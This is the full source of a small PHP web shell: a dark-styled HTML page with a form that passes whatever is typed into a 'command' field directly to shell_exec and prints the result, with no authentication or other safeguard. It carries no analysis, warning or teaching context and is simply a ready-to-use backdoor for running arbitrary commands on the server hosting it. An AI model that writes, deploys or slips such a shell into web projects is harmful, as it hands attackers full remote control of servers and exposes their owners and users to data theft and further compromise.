<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>PHP Web Shell</title>
        <style>
            body { background-color: #333; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
            .container { max-width: 800px; margin: 50px auto; padding: 20px; background-color: #444; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); }
            h1 { text-align: center; color: #00ff00; }
            input, textarea { width: 100%; background-color: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; border-radius: 5px; margin-bottom: 10px; }
            button { width: 100%; background-color: #00ff00; color: #222; border: none; padding: 10px; font-size: 16px; border-radius: 5px; cursor: pointer; }
            button:hover { background-color: #00cc00; }
            pre { background-color: #222; padding: 10px; border-radius: 5px; border: 1px solid #00ff00; overflow-x: auto; }
        </style>
        </head>
    <body>
        <div class="container">
            <h1>PHP Web Shell</h1>
            <form method="POST">
                <input type="text" name="command" placeholder="Enter your command..." autofocus />
                <button type="submit">Run Command</button>
            </form>
            <h3>Output:</h3>
            <pre><?php
            if (isset($_POST['command'])) { echo htmlspecialchars(shell_exec($_POST['command'])); }
        ?></pre>
        </div>
    </body>
</html> 